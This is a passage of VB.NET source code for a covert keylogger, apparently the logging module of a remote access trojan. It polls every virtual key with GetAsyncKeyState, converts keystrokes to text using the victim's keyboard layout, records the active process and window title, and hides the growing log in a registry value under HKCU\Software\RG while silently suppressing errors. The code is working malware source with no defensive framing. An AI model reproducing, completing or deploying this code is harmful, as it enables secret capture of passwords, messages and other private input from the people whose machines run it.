    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing ' Last Pressed Key

    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else

                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle
                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LastAS & ChrW(1) & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Clock As New Microsoft.VisualBasic.Devices.Clock
    Private Function HM() As String
        Try
            Return Clock.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Logs As String = ""
    Dim keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
             HKL)
            Return sbString.ToString()
        Catch : End Try
        Return CType(VKCode, Keys).ToString
    End Function
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = keyboard.ShiftKeyDown
        If keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                    Return "[" & k.ToString & "]"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function

    Public Klen As Integer = 20
    Public RG As String = "RG"
    Public Sub WRK()
        If Klen = 0 Then
            Klen = 20
        End If
        Try : Logs = Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue("kl", "") : Catch : End Try
        Try
            Dim lp As Integer = 0
            While True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim k As Keys = i
                        Dim s = Fix(k)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        lastKey = k
                    End If
                Next
                If lp = 1000 Then
                    lp = 0
                    Dim mx As Integer = Klen * 1024
                    If Logs.Length > mx Then
                        Logs = Logs.Remove(0, Logs.Length - mx)
                    End If
                    Try : Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue("kl", Logs) : Catch : End Try
                End If
                Threading.Thread.Sleep(1)
            End While
        Catch : End Try
    End Sub
End Class
